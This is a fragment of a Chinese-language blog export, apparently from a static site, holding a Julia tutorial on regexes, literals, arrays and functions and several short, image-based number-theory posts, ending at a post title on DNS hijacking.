<figure class="highlight julia-repl"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">julia&gt;</span><span class="language-julia"> <span class="keyword">using</span> Dates</span></span><br><span class="line"><span class="language-julia"></span></span><br><span class="line"><span class="meta prompt_">julia&gt;</span><span class="language-julia"> d = Date(<span class="number">1962</span>,<span class="number">7</span>,<span class="number">10</span>)</span></span><br><span class="line"><span class="language-julia"></span>1962-07-10</span><br><span class="line"></span><br><span class="line"><span class="meta prompt_">julia&gt;</span><span class="language-julia"> regex_d = <span class="built_in">Regex</span>(<span class="string">&quot;Day &quot;</span> * string(day(d)))</span></span><br><span class="line"><span class="language-julia"></span>r&quot;Day 10&quot;</span><br><span class="line"></span><br><span class="line"><span class="meta prompt_">julia&gt;</span><span class="language-julia"> match(regex_d, <span class="string">&quot;It happened on Day 10&quot;</span>)</span></span><br><span class="line"><span class="language-julia"></span>RegexMatch(&quot;Day 10&quot;)</span><br><span class="line"></span><br><span class="line"><span class="meta prompt_">julia&gt;</span><span class="language-julia"> name = <span class="string">&quot;Jon&quot;</span></span></span><br><span class="line"><span class="language-julia"></span>&quot;Jon&quot;</span><br><span class="line"></span><br><span class="line"><span class="meta prompt_">julia&gt;</span><span class="language-julia"> regex_name = <span class="built_in">Regex</span>(<span class="string">&quot;[\&quot;( ]\\Q<span class="variable">$name</span>\\E[\&quot;) ]&quot;</span>)  <span class="comment"># interpolate value of name</span></span></span><br><span class="line"><span class="language-julia"></span>r&quot;[\&quot;( ]\QJon\E[\&quot;) ]&quot;</span><br><span class="line"></span><br><span class="line"><span class="meta prompt_">julia&gt;</span><span class="language-julia"> match(regex_name, <span class="string">&quot; Jon &quot;</span>)</span></span><br><span class="line"><span class="language-julia"></span>RegexMatch(&quot; Jon &quot;)</span><br><span class="line"></span><br><span class="line"><span class="meta prompt_">julia&gt;</span><span class="language-julia"> match(regex_name, <span class="string">&quot;[Jon]&quot;</span>) === <span class="literal">nothing</span></span></span><br><span class="line"><span class="language-julia"></span>true</span><br></pre></td></tr></table></figure>
<p>注意 <code>\Q...\E</code> 转义序列的使用。 <code>\Q</code> 和 <code>\E</code> 之间的所有字符都被解释为字符字面量（在字符串插值之后）。在插入可能是恶意的用户输入时，此转义序列非常有用。</p>
<p><code>Regex()</code> 构造函数可以用于以编程方式创建合法的正则表达式字符串。这允许在构造正则表达式字符串时使用字符串变量的内容和其他字符串操作。上面的任何正则表达式代码可以在 <code>Regex()</code> 的单字符串参数中使用。</p>
<figure class="highlight julia-repl"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">julia&gt;</span><span class="language-julia"> <span class="keyword">using</span> Dates</span></span><br><span class="line"><span class="language-julia"></span></span><br><span class="line"><span class="meta prompt_">julia&gt;</span><span class="language-julia"> d = Date(<span class="number">1962</span>,<span class="number">7</span>,<span class="number">10</span>)</span></span><br><span class="line"><span class="language-julia"></span>1962-07-10</span><br><span class="line"></span><br><span class="line"><span class="meta prompt_">julia&gt;</span><span class="language-julia"> regex_d = <span class="built_in">Regex</span>(<span class="string">&quot;Day &quot;</span> * string(day(d)))</span></span><br><span class="line"><span class="language-julia"></span>r&quot;Day 10&quot;</span><br><span class="line"></span><br><span class="line"><span class="meta prompt_">julia&gt;</span><span class="language-julia"> match(regex_d, <span class="string">&quot;It happened on Day 10&quot;</span>)</span></span><br><span class="line"><span class="language-julia"></span>RegexMatch(&quot;Day 10&quot;)</span><br><span class="line"></span><br><span class="line"><span class="meta prompt_">julia&gt;</span><span class="language-julia"> name = <span class="string">&quot;Jon&quot;</span></span></span><br><span class="line"><span class="language-julia"></span>&quot;Jon&quot;</span><br><span class="line"></span><br><span class="line"><span class="meta prompt_">julia&gt;</span><span class="language-julia"> regex_name = <span class="built_in">Regex</span>(<span class="string">&quot;[\&quot;( ]\\Q<span class="variable">$name</span>\\E[\&quot;) ]&quot;</span>)  <span class="comment"># interpolate value of name</span></span></span><br><span class="line"><span class="language-julia"></span>r&quot;[\&quot;( ]\QJon\E[\&quot;) ]&quot;</span><br><span class="line"></span><br><span class="line"><span class="meta prompt_">julia&gt;</span><span class="language-julia"> match(regex_name, <span class="string">&quot; Jon &quot;</span>)</span></span><br><span class="line"><span class="language-julia"></span>RegexMatch(&quot; Jon &quot;)</span><br><span class="line"></span><br><span class="line"><span class="meta prompt_">julia&gt;</span><span class="language-julia"> match(regex_name, <span class="string">&quot;[Jon]&quot;</span>) === <span class="literal">nothing</span></span></span><br><span class="line"><span class="language-julia"></span>true</span><br></pre></td></tr></table></figure>
<p>注意 <code>\Q...\E</code> 转义序列的使用。 <code>\Q</code> 和 <code>\E</code> 之间的所有字符都被解释为字符字面量（在字符串插值之后）。在插入可能是恶意的用户输入时，此转义序列非常有用。</p>
<h3 id="字节数组字面量"><a href="#字节数组字面量" class="headerlink" title="字节数组字面量"></a>字节数组字面量</h3><p><code>b&quot;...&quot;</code>。这种形式使你能够用字符串表示法来表达只读字面量字节数组，也即 <a href="https://cn.julialang.org/JuliaZH.jl/latest/base/numbers/#Core.UInt8"><code>UInt8</code></a> 值的数组。字节数组字面量的规则如下：</p>
<ul>
<li>ASCII 字符和 ASCII 转义生成单个字节。</li>
<li><code>\x</code> 和八进制转义序列生成与转义值对应的<em>字节</em>。</li>
<li>Unicode 转义序列生成编码 UTF-8 中该代码点的字节序列。</li>
</ul>
<p><img src="/2023/01/30/julia/image-20230308220517089.png" alt="image-20230308220517089"></p>
<p>其中，ASCII 字符串 “DATA” 对应于字节 68, 65, 84, 65。<code>\xff</code> 生成单个字节 255。Unicode 转义 <code>\u2200</code> 在 UTF-8 中被编码为三个字节 226, 136, 128。注意生成的字节数组不对应任何有效 UTF-8 字符串。</p>
<p>对于小于 <code>\u80</code> 的代码，每个代码的 UTF-8 编码恰好只是由相应 <code>\x</code> 转义产生的单个字节，因此忽略两者的差别无伤大雅。然而，从 <code>x80</code> 到 <code>\xff</code> 的转义比起从 <code>u80</code> 到 <code>\uff</code> 的转义来，就有一个主要的差别：前者都只编码为一个字节，它没有形成任何有效 UTF-8 数据，除非它后面有非常特殊的连接字节；而后者则都代表 2 字节编码的 Unicode 代码。</p>
<h3 id="版本号字面量"><a href="#版本号字面量" class="headerlink" title="版本号字面量"></a>版本号字面量</h3><p>版本号很容易用 <a href="https://cn.julialang.org/JuliaZH.jl/latest/base/base/#Base.@v_str"><code>v&quot;...&quot;</code></a> 形式的非标准字符串字面量表示。“<br>例如，<code>v&quot;0.2.1-rc1+win64&quot;</code> 可分为主版本号 <code>0</code>，次版本号 <code>2</code>，补丁版本号 <code>1</code>，预发行版号 <code>rc1</code>，以及生成版本 <code>win64</code>。输入版本字面量时，除了主版本号以外所有内容都是可选的，因此 <code>v&quot;0.2&quot;</code> 等效于 <code>v&quot;0.2.0&quot;</code>（预发行号和生成注释为空），<code>v&quot;2&quot;</code> 等效于 <code>v&quot;2.0.0&quot;</code>，</p>
<p><img src="/2023/01/30/julia/image-20230308221346729.png" alt="image-20230308221346729"></p>
<h2 id="julia数组"><a href="#julia数组" class="headerlink" title="julia数组"></a>julia数组</h2><p>数组，就是相同数据类型的元素按一定顺序排列的集合，可以是一维数组和多维数组。<br>Julia 支持数组数据结构，它可以存储一个大小不是固定的，类型可以相同也可以不同的顺序集合。<br>Julia 数组是可变类型集合，用于列表、向量、表格和矩阵。<br>Julia 数组的索引键值可以使用整数表示，数组的大小不是固定的。<br>Julia 提供了很多函数帮助我们来操作数组，比如数组添加元素，合并数组等。<br>Julia 数组用方括号 […] 指定，多个元素使用逗号 , 分隔。<br>创建一个一维数组(即一个向量)语法为:</p>
<figure class="highlight julia"><table><tr><td class="code"><pre><span class="line">[A,B,C,...]</span><br></pre></td></tr></table></figure>
<h2 id="创建一维数组"><a href="#创建一维数组" class="headerlink" title="创建一维数组"></a>创建一维数组</h2><figure class="highlight julia"><table><tr><td class="code"><pre><span class="line">arr = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]</span><br></pre></td></tr></table></figure>
<p>实例：</p>
<p><img src="/2023/01/30/julia/image-20230130114920630.png" alt="image-20230130114920630"></p>
<p><img src="/2023/01/30/julia/image-20230130115038875.png" alt="image-20230130115038875"></p>
<p>创建的数组可以直接使用索引值来访问，第一个值的索引为 1（不是 0），第二个值索引为 2，以此类推，最后一个可以使用 <strong>end</strong> 表示：</p>
<p><img src="/2023/01/30/julia/image-20230130115605574.png" alt="image-20230130115605574"></p>
<h3 id="创建一个空数组"><a href="#创建一个空数组" class="headerlink" title="创建一个空数组"></a>创建一个空数组</h3><p><img src="/2023/01/30/julia/image-20230130115327515.png" alt="image-20230130115327515"></p>
<p>以上实例数组 <strong>arr3</strong> 限制只能输入整数，<strong>arr4</strong> 限制只能输入字符串。</p>
<h2 id="指定数组类型及维度"><a href="#指定数组类型及维度" class="headerlink" title="指定数组类型及维度"></a>指定数组类型及维度</h2><figure class="highlight julia"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Array</span>&#123;type&#125;(<span class="literal">undef</span>, dims...)</span><br></pre></td></tr></table></figure>
<p><strong>undef</strong> 表示数组未初始化。<br><strong>dims…</strong> 可以是维度的单多元组，也可以是维度作为可变参数时的一组值。<br><strong>dims…</strong> 数字表示元素个数，多个维度使用逗号 <strong>,</strong> 分隔。</p>
<figure class="highlight julia"><table><tr><td class="code"><pre><span class="line">julia&gt; array = <span class="built_in">Array</span>&#123;<span class="built_in">Int64</span>&#125;(<span class="literal">undef</span>, <span class="number">3</span>)   <span class="comment"># 表示一维数组，数组有 3 个元素</span></span><br><span class="line"><span class="number">3</span>-element <span class="built_in">Vector</span>&#123;<span class="built_in">Int64</span>&#125;:</span><br><span class="line"> <span class="number">4834342704</span></span><br><span class="line"> <span class="number">4377305096</span></span><br><span class="line">     <span class="number">0</span></span><br><span class="line"></span><br><span class="line">julia&gt; array = <span class="built_in">Array</span>&#123;<span class="built_in">Int64</span>&#125;(<span class="literal">undef</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">3</span>)   <span class="comment"># 表示 3 维数组，每个维度数组有 3 个元素</span></span><br><span class="line"><span class="number">3</span>×<span class="number">3</span>×<span class="number">3</span> <span class="built_in">Array</span>&#123;<span class="built_in">Int64</span>, <span class="number">3</span>&#125;:</span><br><span class="line">[:, :, <span class="number">1</span>] =</span><br><span class="line"> <span class="number">4562265712</span> <span class="number">0</span> <span class="number">0</span></span><br><span class="line">     <span class="number">1</span> <span class="number">0</span> <span class="number">0</span></span><br><span class="line">     <span class="number">0</span> <span class="number">0</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line">[:, :, <span class="number">2</span>] =</span><br><span class="line"> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span></span><br><span class="line"> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span></span><br><span class="line"> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line">[:, :, <span class="number">3</span>] =</span><br><span class="line"> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span></span><br><span class="line"> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span></span><br><span class="line"> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span></span><br></pre></td></tr></table></figure>
<p>以上实例中，数组的类型我们放在花括号中 <strong>{}</strong>， undef 用于设置数组未初始化为任何已知值，这就是我们在输出中得到随机数的原因。</p>
<h2 id="创建二维数组和矩阵"><a href="#创建二维数组和矩阵" class="headerlink" title="创建二维数组和矩阵"></a>创建二维数组和矩阵</h2><p>我们可以将数组元素中的逗号 <strong>,</strong> 省略掉或者使用两个冒号 <strong>;;</strong>，这样就可以创建一个二维数组了，如下实例：</p>
<p><img src="/2023/01/30/julia/image-20230130120933084.png" alt="image-20230130120933084"></p>
<p><strong>注意：</strong>第一行输出的 <strong>1×4 Matrix{Int64}:</strong>，1x4 表示一行四列的矩阵。|<br>虽然只有一行，也是二维数组，因为 Julia 只认可列向量，而不认可所谓的行向量。<br>要添加另一行，只需添加分号 <strong>;</strong>，看以下实例：</p>
<p><img src="/2023/01/30/julia/image-20230130121016370.png" alt="image-20230130121016370"></p>
<p>也可以使用冒号 <strong>:</strong> 和空格  来实现，看以下实例：</p>
<p><img src="/2023/01/30/julia/image-20230130121056843.png" alt="image-20230130121056843"></p>
<p><strong>注意：</strong>第一行输出的 <strong>2×2 Matrix{Int64}:</strong>，2×2 表示两行两列的矩阵。<br>我们也可以在方括号 <strong>[]</strong> 中嵌入多个长度相同的一维数组，并用空格分隔来创建二维数组：</p>
<p><img src="/2023/01/30/julia/image-20230130121234288.png" alt="image-20230130121234288"></p>
<p><strong>2x3</strong> 表示两行三列的数组。<br>下面我们通过灵活运用分号 <strong>;</strong> 和空格  创建一个两行三列和三行两列的二维数组：</p>
<p><img src="/2023/01/30/julia/image-20230130121355607.png" alt="image-20230130121355607"></p>
<p>可以看到，在矩阵中，<strong>;</strong>意味着换行</p>
<h2 id="使用范围函数来创建数组"><a href="#使用范围函数来创建数组" class="headerlink" title="使用范围函数来创建数组"></a>使用范围函数来创建数组</h2><h3 id="省略号…"><a href="#省略号…" class="headerlink" title="省略号…"></a>省略号…</h3><p><img src="/2023/01/30/julia/image-20230130121648639.png" alt="image-20230130121648639"></p>
<h3 id="collect-函数"><a href="#collect-函数" class="headerlink" title="collect()函数"></a>collect()函数</h3><figure class="highlight julia"><table><tr><td class="code"><pre><span class="line">collect(element_type,start:step:stop)</span><br></pre></td></tr></table></figure>
<p>element_type为数据类型，start为开始值，step为步长，stop为结束值。该函数返回数组。</p>
<p><img src="/2023/01/30/julia/image-20230130123945023.png" alt="image-20230130123945023"><img src="/2023/01/30/julia/image-20230130124001687.png" alt="image-20230130124001687"></p>
<p>创建一个浮点型数组</p>
<p><img src="/2023/01/30/julia/image-20230130124730690.png" alt="image-20230130124730690"></p>
<h3 id="range-函数"><a href="#range-函数" class="headerlink" title="range()函数"></a>range()函数</h3><p>range() 函数可以生存一个区间范围并指定步长，可以方便 collect() 函数 调用。range() 函数语法格式如下：<br>range(start, stop, length) range(start, stop; length, step) range(start; length, stop, step) range(;start, length, stop, step)<br>start 为开始值，step 为步长，stop 为结束值，length 为长度。</p>
<p><img src="/2023/01/30/julia/image-20230130130603394.png" alt="image-20230130130603394"></p>
<p>如果未指定长度length，且stop-start不是step的整数倍，则将生成在stop之前结束的范围</p>
<p><img src="/2023/01/30/julia/image-20230130130828796.png" alt="image-20230130130828796"></p>
<p>使用range()和collect()创建数组</p>
<p><img src="/2023/01/30/julia/image-20230130131031598.png" alt="image-20230130131031598"></p>
<p>使用推导式和生成器创建数组</p>
<p>创建数组的另一种有用方法是使用推导。数组推导式语法格式如下：</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">A = [ F(x,y,<span class="built_in">..</span>.) <span class="keyword">for</span> <span class="attribute">x</span>=rx, <span class="attribute">y</span>=ry, <span class="built_in">..</span>. ]</span><br></pre></td></tr></table></figure>
<p>F(x,y,…) 取其给定列表中变量 x，y 等的每个值进行计算。值可以指定为任何可迭代对象，但通常是 1:n 或 2:(n-1) 之类的范围，或者像 [1.2, 3.4, 5.7] 这样的显式数组值。结果是一个 N 维密集数组，将变量范围 rx，ry 等的维数拼接起来得到其维数，并且每次 F(x,y,…) 计算返回一个标量。</p>
<p><img src="/2023/01/30/julia/image-20230130131602843.png" alt="image-20230130131602843"></p>
<p>创建二维数组</p>
<p><img src="/2023/01/30/julia/image-20230130131658616.png" alt="image-20230130131658616"></p>
<p>创建数组和求和</p>
<p><img src="/2023/01/30/julia/image-20230130131823703.png" alt="image-20230130131823703"></p>
<p>基本函数</p>
<p><img src="/2023/01/30/julia/image-20230130132252096.png" alt="image-20230130132252096"></p>
<p>eltype(A)：A中元素的类型<br><img src="/2023/01/30/julia/image-20230130132427217.png" alt="image-20230130132427217"></p>
<p>length(A)：A中元素的数量<br><img src="/2023/01/30/julia/image-20230130132542476.png" alt="image-20230130132542476"></p>
<p>ndims(A)：A的维数<br><img src="/2023/01/30/julia/image-20230130132727871.png" alt="image-20230130132727871"></p>
<p>size(A)：一个包含A各个维度上元素数量的元组<br><img src="/2023/01/30/julia/image-20230130132843939.png" alt="image-20230130132843939"></p>
<p>size(A,n)：A第n维中的元素数量<br><img src="/2023/01/30/julia/image-20230130133005666.png" alt="image-20230130133005666"></p>
<p>axes(A)：一个包含A有效索引的元组<br><img src="/2023/01/30/julia/image-20230130133400344.png" alt="image-20230130133400344"></p>
<p>axes(A,n)：第n维有效索引的范围<br><img src="/2023/01/30/julia/image-20230130133338454.png" alt="image-20230130133338454"></p>
<p>eachindex(A):一个访问A中每一个位置的高效迭代器<br><img src="/2023/01/30/julia/image-20230130133705581.png" alt="image-20230130133705581"><br><img src="/2023/01/30/julia/image-20230130133738104.png" alt="image-20230130133738104"></p>
<p>stride(A,k)：第k维上的间隔（相邻元素间的线性索引距离）<br>strides(A)：包含每一个维上的间隔的元组<br><img src="/2023/01/30/julia/image-20230130134737685.png" alt="image-20230130134737685"></p>
<p>Julia构造和初始化</p>
<p>Julia 提供了许多用于构造和初始化数组的函数。在下列函数中，参数 dims … 可以是一个元组 tuple 来表示维数，也可以是一个可变长度的整数值作为维数。大部分函数的第一个参数都表示数组的元素类型 T 。如果类型 T 被省略，那么将默认为 Float64。</p>
<p>Array{T}(undef,dims…)：一个没有初始化的密集Array<br><img src="/2023/01/30/julia/image-20230130161838694.png" alt="image-20230130161838694"></p>
<p>zeros(T,dims…)：一个全零Array<br><img src="/2023/01/30/julia/image-20230130161957271.png" alt="image-20230130161957271"><img src="/2023/01/30/julia/image-20230130162009554.png" alt="image-20230130162009554"></p>
<p>ones(T,dims…)：一个元素均为1的Array<br><img src="/2023/01/30/julia/image-20230130162145462.png" alt="image-20230130162145462"><img src="/2023/01/30/julia/image-20230130162159907.png" alt="image-20230130162159907"></p>
<p>trues(dims…)和falses(dims…)：一个每个元素都为true的BitArray<br><img src="/2023/01/30/julia/image-20230130162333850.png" alt="image-20230130162333850"><img src="/2023/01/30/julia/image-20230130162345274.png" alt="image-20230130162345274"></p>
<p>reshape(A,dims…)：一个包含跟A相同数据但维数不同的数组<br><img src="/2023/01/30/julia/image-20230130162828790.png" alt="image-20230130162828790" style="zoom:67%;"><img src="/2023/01/30/julia/image-20230130162924534.png" alt="image-20230130162924534" style="zoom:80%;"></p>
<p>copy(A)：拷贝A<br><img src="/2023/01/30/julia/image-20230130163037419.png" alt="image-20230130163037419"></p>
<p>deepcopy(A)：深拷贝，即拷贝A，并递归地拷贝其元素<br><img src="/2023/01/30/julia/image-20230130163737083.png" alt="image-20230130163737083"><br>深拷贝会使新变量与原变量地址不同</p>
<p>similar(A,T,dims…)：一个与<code>A</code>具有相同类型（这里指的是密集，稀疏等）的未初始化数组，但具有指定的元素类型和维数。第二个和第三个参数都是可选的，如果省略则默认为元素类型和 <code>A</code> 的维数。<br><img src="/2023/01/30/julia/image-20230130164201573.png" alt="image-20230130164201573"></p>
<p>reinterpret(T,A)：与A具有相同二进制数据的数组，但元素类型为T<br><img src="/2023/01/30/julia/image-20230130164742475.png" alt="image-20230130164742475"></p>
<p>rand(T,dims…)：一个随机 <code>Array</code>，元素值是 [0,1)[0,1) 半开区间中的均匀分布且服从一阶独立同分布<br><img src="/2023/01/30/julia/image-20230130165422957.png" alt="image-20230130165422957"><br><img src="/2023/01/30/julia/image-20230130165440922.png" alt="image-20230130165440922"><br><img src="/2023/01/30/julia/image-20230130165551400.png" alt="image-20230130165551400"><br><img src="/2023/01/30/julia/image-20230130165817415.png" alt="image-20230130165817415"><br><img src="/2023/01/30/julia/image-20230130171130482.png" alt="image-20230130171130482"></p>
<p>randn(T,dims…)：一个随机Array，元素为标准正态分布，服从独立同分布<br><img src="/2023/01/30/julia/image-20230130171249100.png" alt="image-20230130171249100"></p>
<p>fill!(A,x)：用值x填充数组A<br><img src="/2023/01/30/julia/image-20230130171755602.png" alt="image-20230130171755602"></p>
<p>fill(x,dims…)：一个被值x填充的Array<br><img src="/2023/01/30/julia/image-20230130171920200.png" alt="image-20230130171920200"></p>
<p>Julia元组</p>
<h2 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h2><p><img src="/2023/01/30/julia/image-20230310185109759.png" alt="image-20230310185109759"></p>
<p>或</p>
<p><img src="/2023/01/30/julia/image-20230310185149596.png" alt="image-20230310185149596"></p>
<p>没有括号时，表达式 <code>f</code> 指的是函数对象，可以像任何值一样被传递：<br><img src="/2023/01/30/julia/image-20230310185242579.png" alt="image-20230310185242579"></p>
<h3 id="参数传递行为"><a href="#参数传递行为" class="headerlink" title="参数传递行为"></a>参数传递行为</h3><p>Julia 函数参数遵循有时称为 “pass-by-sharing” 的约定，这意味着变量在被传递给函数时其值并不会被复制。函数参数本身充当新的变量绑定（指向变量值的新地址），它们所指向的值与所传递变量的值完全相同。</p>
<h3 id="参数类型声明"><a href="#参数类型声明" class="headerlink" title="参数类型声明"></a>参数类型声明</h3><p><code>::TypeName</code> 附加到参数名称来声明函数参数的类型</p>
<h3 id="return关键字"><a href="#return关键字" class="headerlink" title="return关键字"></a>return关键字</h3><p><img src="/2023/01/30/julia/image-20230310202504047.png" alt="image-20230310202504047"></p>
<h3 id="返回类型"><a href="#返回类型" class="headerlink" title="返回类型"></a>返回类型</h3><p>使用 <code>::</code> 运算符在函数声明中指定返回类型。<br><img src="/2023/01/30/julia/image-20230310203409944.png" alt="image-20230310203409944"></p>
<h3 id="返回nothing"><a href="#返回nothing" class="headerlink" title="返回nothing"></a>返回nothing</h3><p>对于不需要任何返回值的函数（只用来产生副作用的函数）， Julia 中的写法为返回值<a href="https://cn.julialang.org/JuliaZH.jl/latest/base/constants/#Core.nothing"><code>nothing</code></a>:</p>
<figure class="highlight julia"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> printx(x)</span><br><span class="line">    println(<span class="string">&quot;x = <span class="variable">$x</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">nothing</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>
<p>这在某种意义上是一个“惯例”，在 Julia 中 <code>nothing</code> 不是一个关键字，而是 <code>Nothing</code> 类型的一个单例（singleton）。 </p>
<p>有两种比 <code>return nothing</code> 更短的写法：一种是直接写 <code>return</code> 这会隐式的返回 <code>nothing</code>。 另一种是在函数的最后一行写上 <code>nothing</code>，因为函数会隐式的返回最后一个表达式的值。 三种写法使用哪一种取决于代码风格的偏好。</p>
<h3 id="匿名函数"><a href="#匿名函数" class="headerlink" title="匿名函数"></a>匿名函数</h3><p><img src="/2023/01/30/julia/image-20230310204350680.png" alt="image-20230310204350680"></p>
<p><img src="/2023/01/30/julia/image-20230310204457475.png" alt="image-20230310204457475"></p>
<p>如果做为第一个参数传递给 <a href="https://cn.julialang.org/JuliaZH.jl/latest/base/collections/#Base.map"><code>map</code></a> 的转换函数已经存在，那直接使用函数名称是没问题的。但是通常要使用的函数还没有定义好，这样使用匿名函数就更加方便：</p>
<p><img src="/2023/01/30/julia/image-20230310204918387.png" alt="image-20230310204918387"></p>
<p>接受多个参数的匿名函数写法可以使用语法 <code>(x,y,z)-&gt;2x+y-z</code>，而无参匿名函数写作 <code>()-&gt;3</code> 。</p>
<p>例如，考虑对 <a href="https://cn.julialang.org/JuliaZH.jl/latest/base/collections/#Base.get"><code>get</code></a> 的调用：</p>
<figure class="highlight julia"><table><tr><td class="code"><pre><span class="line">get(dict, key) <span class="keyword">do</span></span><br><span class="line">    <span class="comment"># default value calculated here</span></span><br><span class="line">    time()</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>
<p>上面的代码等效于使用包含代码的匿名函数调用<code>get</code>。 被包围在do和end之间，如下所示</p>
<figure class="highlight julia"><table><tr><td class="code"><pre><span class="line">get(()-&gt;time(), dict, key)</span><br></pre></td></tr></table></figure>
<p>这里对 <a href="https://cn.julialang.org/JuliaZH.jl/latest/base/base/#Base.Libc.time-Tuple{}"><code>time</code></a> 的调用，被包裹了它的一个无参数的匿名函数延迟了。该匿名函数只当 <code>dict</code> 缺少被请求的键时，才被调用。</p>
<h2 id="元组"><a href="#元组" class="headerlink" title="元组"></a>元组</h2>]]></content>
      <categories>
        <category>编程语言</category>
      </categories>
      <tags>
        <tag>julia</tag>
      </tags>
  </entry>
  <entry>
    <title>等价关系、同余、算数基本定理</title>
    <url>/2023/01/18/%E7%AD%89%E4%BB%B7%E5%85%B3%E7%B3%BB/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>算术基本证明、等价关系、同余的概念</p>
<span id="more"></span>
<h2 id="等价关系"><a href="#等价关系" class="headerlink" title="等价关系"></a>等价关系</h2><p><img src="/2023/01/18/%E7%AD%89%E4%BB%B7%E5%85%B3%E7%B3%BB/image-20230224223050878.png" alt="image-20230224223050878"><br><img src="/2023/01/18/%E7%AD%89%E4%BB%B7%E5%85%B3%E7%B3%BB/image-20230224223142072.png" alt="image-20230224223142072"></p>
<h2 id="同余"><a href="#同余" class="headerlink" title="同余"></a>同余</h2><p><img src="/2023/01/18/%E7%AD%89%E4%BB%B7%E5%85%B3%E7%B3%BB/image-20230224223222576.png" alt="image-20230224223222576"></p>
<h2 id="基本算数定理"><a href="#基本算数定理" class="headerlink" title="基本算数定理"></a>基本算数定理</h2><p><img src="/2023/01/18/%E7%AD%89%E4%BB%B7%E5%85%B3%E7%B3%BB/image-20230224223251565.png" alt="image-20230224223251565"></p>
]]></content>
      <categories>
        <category>数论</category>
      </categories>
  </entry>
  <entry>
    <title>最大公约数、最小公倍数及扩展的欧几里得定理</title>
    <url>/2023/01/16/%E6%9C%80%E5%A4%A7%E5%85%AC%E7%BA%A6%E6%95%B0/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>最大公约数、最小公倍数、扩展欧几里得概念及例题</p>
<span id="more"></span>
<h2 id="最大公约数"><a href="#最大公约数" class="headerlink" title="最大公约数"></a>最大公约数</h2><p><img src="/2023/01/16/%E6%9C%80%E5%A4%A7%E5%85%AC%E7%BA%A6%E6%95%B0/image-20230224222214313.png" alt="image-20230224222214313"><br><img src="/2023/01/16/%E6%9C%80%E5%A4%A7%E5%85%AC%E7%BA%A6%E6%95%B0/image-20230224222315322.png" alt="image-20230224222315322"></p>
<h2 id="欧几里得算法"><a href="#欧几里得算法" class="headerlink" title="欧几里得算法"></a>欧几里得算法</h2><p><img src="/2023/01/16/%E6%9C%80%E5%A4%A7%E5%85%AC%E7%BA%A6%E6%95%B0/image-20230224222255480.png" alt="image-20230224222255480"></p>
<h2 id="最小公倍数"><a href="#最小公倍数" class="headerlink" title="最小公倍数"></a>最小公倍数</h2><p><img src="/2023/01/16/%E6%9C%80%E5%A4%A7%E5%85%AC%E7%BA%A6%E6%95%B0/image-20230224222421455.png" alt="image-20230224222421455"></p>
<h2 id="扩展欧几里得算法"><a href="#扩展欧几里得算法" class="headerlink" title="扩展欧几里得算法"></a>扩展欧几里得算法</h2><p><img src="/2023/01/16/%E6%9C%80%E5%A4%A7%E5%85%AC%E7%BA%A6%E6%95%B0/image-20230224222457768.png" alt="image-20230224222457768"><br><img src="/2023/01/16/%E6%9C%80%E5%A4%A7%E5%85%AC%E7%BA%A6%E6%95%B0/image-20230224222514728.png" alt="image-20230224222514728"></p>
]]></content>
      <categories>
        <category>数论</category>
      </categories>
  </entry>
  <entry>
    <title>整除、素数以及模运算</title>
    <url>/2023/01/15/%E6%95%B4%E9%99%A4/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>整除性的证明和定理</p>
<span id="more"></span>
<h2 id="整除性"><a href="#整除性" class="headerlink" title="整除性"></a>整除性</h2><p><img src="/2023/01/15/%E6%95%B4%E9%99%A4/image-20230224212555205.png" alt="image-20230224212555205"></p>
<h2 id="定理"><a href="#定理" class="headerlink" title="定理"></a>定理</h2><p><img src="/2023/01/15/%E6%95%B4%E9%99%A4/image-20230224212744015.png" alt="image-20230224212744015"></p>
<h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><p><img src="/2023/01/15/%E6%95%B4%E9%99%A4/image-20230224212803687.png" alt="image-20230224212803687"><br><img src="/2023/01/15/%E6%95%B4%E9%99%A4/image-20230224215937234.png" alt="image-20230224215937234"></p>
<h2 id="素数"><a href="#素数" class="headerlink" title="素数"></a>素数</h2><p><img src="/2023/01/15/%E6%95%B4%E9%99%A4/image-20230224220858842.png" alt="image-20230224220858842"></p>
<p><img src="/2023/01/15/%E6%95%B4%E9%99%A4/image-20230224220948559.png" alt="image-20230224220948559"></p>
<h2 id="欧几里得定理"><a href="#欧几里得定理" class="headerlink" title="欧几里得定理"></a>欧几里得定理</h2><p><img src="/2023/01/15/%E6%95%B4%E9%99%A4/image-20230224221011817.png" alt="image-20230224221011817"></p>
<h2 id="模运算"><a href="#模运算" class="headerlink" title="模运算"></a>模运算</h2><p><img src="/2023/01/15/%E6%95%B4%E9%99%A4/image-20230224221823945.png" alt="image-20230224221823945"></p>
]]></content>
      <categories>
        <category>数论</category>
      </categories>
  </entry>
  <entry>
    <title>DNS劫持</title>
    <url>/2023/01/04/DNS%E5%8A%AB%E6%8C%81/</url>
